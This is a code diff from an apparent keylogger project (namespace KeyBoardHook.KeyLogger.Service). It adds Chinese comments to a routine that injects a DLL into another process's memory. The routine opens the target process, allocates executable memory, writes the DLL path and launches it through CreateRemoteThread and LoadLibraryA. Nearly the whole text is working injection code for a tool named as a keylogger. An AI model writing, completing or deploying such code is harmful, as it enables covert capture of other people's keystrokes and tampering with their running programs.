@@ -144,10 +144,11 @@ namespace KeyBoardHook.KeyLogger.Service
 
             var hWnd = NativeMethods.FindWindow(className,title);
             IntPtr threadId;
-            NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
+            var windowThreadProcessId = NativeMethods.GetWindowThreadProcessId(hWnd, out threadId);
 
-            MessageBox.Show("threadId: " + threadId);
+            MessageBox.Show($@"hWnd {hWnd},windowThreadProcessId {windowThreadProcessId},threadId {threadId}");
             {
+                // 用来获取目标进程句柄
                 IntPtr hndProc = NativeMethods.OpenProcess((0x2 | 0x8 | 0x10 | 0x20 | 0x400), true, threadId);
                 if (hndProc == IntPtr.Zero)
                 {
@@ -155,6 +156,8 @@ namespace KeyBoardHook.KeyLogger.Service
                     return;
                 }
                     
+                // GetModuleHandle()和GetProcAddress()用来获取LoadLibrary()函数地址，进而用来调用LoadLibrary()
+                // (Unicod为LoadLibraryW，ANSI为LoadLibraryA)
                 IntPtr lpLLAddress = NativeMethods.GetProcAddress(NativeMethods.GetModuleHandle("kernel32.dll"), "LoadLibraryA");
                 if (lpLLAddress == IntPtr.Zero)
                 {
@@ -162,6 +165,7 @@ namespace KeyBoardHook.KeyLogger.Service
                     return;
                 }
                     
+                // 用来将DLL路径写入目标进程内存
                 IntPtr lpAddress = NativeMethods.VirtualAllocEx(hndProc, (IntPtr)null, (IntPtr)sDllPath.Length, (0x1000 | 0x2000), 0X40);
 
                 if (lpAddress == IntPtr.Zero)
@@ -171,6 +175,7 @@ namespace KeyBoardHook.KeyLogger.Service
                 }
                 byte[] bytes = Encoding.ASCII.GetBytes(sDllPath);
 
+                // 用来将DLL路径写入分配的缓冲区
                 var writeProcessMemory = NativeMethods.WriteProcessMemory(hndProc, lpAddress, bytes, (uint)bytes.Length, 0);
                 if (writeProcessMemory == 0)
                 {
@@ -184,6 +189,7 @@ namespace KeyBoardHook.KeyLogger.Service
                     MessageBox.Show("CreateRemoteThread 异常");
                     return;       
                 }
+                // NativeMethods.CloseHandle(remoteThread);
                 NativeMethods.CloseHandle(hndProc);
             }
             
